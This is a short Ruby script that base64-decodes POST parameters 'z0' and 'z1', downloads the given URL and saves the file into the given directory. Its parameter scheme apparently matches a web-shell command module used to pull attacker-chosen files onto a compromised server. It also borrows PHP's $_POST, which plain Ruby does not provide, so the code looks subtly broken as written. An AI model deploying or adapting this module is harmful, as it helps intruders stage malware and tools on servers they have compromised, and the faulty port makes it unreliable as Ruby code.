require 'base64'
require 'json'
require 'net/http'
require 'uri'

def main
  url_str  = Base64.decode64($_POST['z0'].to_s)
  save_dir = Base64.decode64($_POST['z1'].to_s)

  unless url_str.start_with?('http://', 'https://')
    url_str = "http://#{url_str}"
  end

  begin
    uri = URI.parse(url_str)
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = (uri.scheme == 'https')
    http.read_timeout = 30

    request = Net::HTTP::Get.new(uri.request_uri)
    response = http.request(request)

    unless response.is_a?(Net::HTTPSuccess)
      raise "HTTP Server returned code #{response.code}"
    end

    filename = nil

    cd_header = response['content-disposition']
    if cd_header && cd_header =~ /filename="?([^";\n]+)"?/i
      filename = $1.to_s.strip
    end

    if filename.nil? || filename.empty?
      path = uri.path || ''
      filename = File.basename(path)
    end

    if filename.nil? || filename.empty? || filename == '/'
      filename = 'download.bin'
    end

    file_path = File.join(save_dir, filename)

    File.binwrite(file_path, response.body)

    print JSON.generate({
      'success'  => true,
      'filename' => filename,
      'path'     => file_path
    })

  rescue => e
    print JSON.generate({
      'success' => false,
      'error'   => "Download failed: #{e.message}"
    })
  end
end

main